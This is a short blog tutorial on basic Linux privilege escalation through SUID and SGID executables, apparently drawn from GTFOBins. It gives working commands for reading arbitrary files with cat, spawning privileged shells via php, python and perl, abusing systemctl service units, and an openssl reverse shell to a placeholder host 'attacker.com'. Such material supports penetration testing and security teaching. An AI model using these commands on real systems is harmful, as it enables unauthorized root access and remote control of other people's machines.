---
layout: post
title: 'SUID Executables - Basic Linux Privilage Escalation '
description: Basic Linux Privilage Escalation
date: '2019-07-18 21:03:36 +0530'
categories: Privilage Escalation
published: true
---

SUID and GUID are useful features when  unprivilaged users are needed to access a program. With them, if unprivileged user access files which are set suid, files run with its owner permissions. Also, guid is similar to suid. In this time program runs with groups permissions.
For example; when user "thomas" runs below file, file run with intern privileges because of suids.

![pic1.png]({{site.baseurl}}/pics/pic1.png)


To give suid ,guid can be run below command.

```bash
chmod u+s file.sh
chmod g+s file.sh
```

SGID and SUID are also dangerous as much as they are useful. With them, security holes can be easily opened. So they should be used carefully. 

To find all suid,guid files on computer below command can be run.

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```


How to escalate our privileges using SUID?

For each program, our approach will be different.
About that there is a wonderful website which includes information about how used each program to escalation.

[https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)

Let's look at some commands how they used in escalation.


### cat

To use cat to access all files directly use it. 

```bash
LFILE=file_to_read
cat "$LFILE"
```
### opensssl

To escalate our privileges we can get reverse shell with openssl
by running below command on attacker machine, we make certificates to ssl connection.

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
```

then we connect to the attacker by below commands. Our connection encrypted.

```bash
RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
```
### python, perl, php

All compilers are so dangerous to give suids. With then we directly open privilaged shell

```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
./perl -e 'exec "/bin/sh";'
```
### systemctl

Systemctl a command to control systemd which runs, creates, stops services on computer. With creating our services we escalate our privileges.

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```

